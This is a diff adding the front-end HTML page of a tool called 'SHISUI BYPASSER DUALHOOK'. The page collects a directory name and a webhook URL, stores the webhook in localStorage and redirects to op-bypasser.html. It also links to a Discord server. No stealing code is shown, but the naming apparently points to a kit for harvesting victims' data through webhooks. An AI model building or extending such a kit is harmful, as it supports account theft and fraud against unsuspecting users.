@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SHISUI BYPASSER DUALHOOK</title>
+  <style>
+      body {
+          font-family: sans-serif;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+          margin: 0;
+          overflow: hidden; /* Prevent scrollbars */
+          background-color: #000; /* Black background */
+          color: #eee; /* Light text for contrast */
+      }
+      #matrixCanvas {
+          position: fixed; /* Position canvas behind content */
+          top: 0;
+          left: 0;
+          z-index: -1; /* Ensure it's in the background */
+      }
+      .container {
+          background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white */
+          backdrop-filter: blur(5px); /* Optional: adds a blur effect behind the container */
+          padding: 30px;
+          border-radius: 8px;
+          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); /* Darker shadow for black background */
+          width: 100%;
+          max-width: 400px;
+          box-sizing: border-box;
+          position: relative; /* Ensure container is above canvas */
+          z-index: 1;
+          border: 1px solid rgba(0, 255, 0, 0.3); /* Subtle green border */
+      }
+      h1 {
+          text-align: center;
+          color: #0F0; /* Green title */
+          margin-bottom: 25px;
+          text-shadow: 0 0 5px #0F0; /* Glow effect */
+      }
+      .form-group {
+          margin-bottom: 20px;
+      }
+      label {
+          display: block;
+          margin-bottom: 8px;
+          color: #0F0; /* Green labels */
+          font-weight: bold;
+      }
+      input[type="text"] {
+          width: 100%;
+          padding: 12px;
+          border: 1px solid #0F0; /* Green border for inputs */
+          background-color: rgba(0, 0, 0, 0.5); /* Darker input background */
+          color: #0F0; /* Green text in inputs */
+          border-radius: 4px;
+          box-sizing: border-box;
+          font-size: 16px;
+      }
+      input[type="text"]:focus {
+          border-color: #00FF00;
+          outline: none;
+          box-shadow: 0 0 0 3px rgba(0, 255, 0, 0.25);
+      }
+      button {
+          width: 100%;
+          padding: 12px;
+          background-color: #007bff; /* Blue button, can change to green if preferred */
+          color: white;
+          border: none;
+          border-radius: 4px;
+          font-size: 18px;
+          cursor: pointer;
+          transition: background-color 0.2s ease;
+      }
+      button:hover {
+          background-color: #0056b3;
+      }
+      .discord-button {
+          display: flex; /* Use flexbox for icon and text alignment */
+          align-items: center; /* Vertically center items */
+          justify-content: center; /* Horizontally center items */
+          width: 100%;
+          padding: 12px;
+          margin-top: 20px; /* Space above the button */
+          background-color: #5865F2; /* Discord brand color */
+          color: white;
+          border: none;
+          border-radius: 4px;
+          font-size: 18px;
+          text-align: center;
+          text-decoration: none; /* Remove underline from link */
+          cursor: pointer;
+          transition: background-color 0.2s ease;
+      }
+      .discord-button:hover {
+          background-color: #4752C4; /* Darker shade on hover */
+      }
+      .discord-button svg {
+          margin-right: 8px; /* Space between icon and text */
+          width: 24px; /* Icon size */
+          height: 24px; /* Icon size */
+          fill: currentColor; /* Make SVG color match text color */
+      }
+  </style>
+</head>
+<body>
+  <canvas id="matrixCanvas"></canvas> <!-- The canvas for the animation -->
+  <div class="container">
+      <h1>SHISUI BYPASSER DUALHOOK</h1>
+      <form>
+          <div class="form-group">
+              <label for="directory">Directory:</label>
+              <input type="text" id="directory" name="directory" placeholder="Enter directory path (e.g., 'my-bypasser')" required>
+          </div>
+          <div class="form-group">
+              <label for="webhook">Webhook:</label>
+              <input type="text" id="webhook" name="webhook" placeholder="Enter webhook URL for dualhook" required>
+          </div>
+          <button type="submit">Submit</button>
+      </form>
+      <a href="https://discord.gg/zAYJTgaCs6" target="_blank" class="discord-button">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 245 240">
+          <path d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3 18.5-12.7 9.7 1.3 4.4 11.3-8.4 17 13.8 1.8-2.7-17-13.8 5.3-18.5c11.3 0 20.5-9.2 20.5-20.6V40.6C205 29.2 195.8 20 189.5 20zm-62.6 144.7c-29.8 0-54.3-26.3-54.3-58.5 0-32.5 24.1-58.6 53.9-58.6 29.7 0 54.3 26.3 54.3 58.6 0 32.5-24.1 58.5-53.9 58.5z"/>
+        </svg>
+        Join Discord
+      </a>
+  </div>
+  <script src="matrix-animation.js"></script> <!-- Link to the animation script -->
+  <script>
+      document.querySelector('form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const directory = encodeURIComponent(document.getElementById('directory').value); // Encode for URL
+        const webhook = document.getElementById('webhook').value;
+
+        // Store the webhook in local storage for the next page
+        localStorage.setItem('dualhookWebhook', webhook);
+
+        // Redirect to the new page, passing the directory as a query parameter
+        window.location.href = `op-bypasser.html?directory=${directory}`;
+
+        console.log('Directory submitted:', directory);
+        console.log('Webhook stored:', webhook);
+        console.log('Redirecting to op-bypasser.html with query parameter');
+      });
+    </script>
+</body>
+</html>
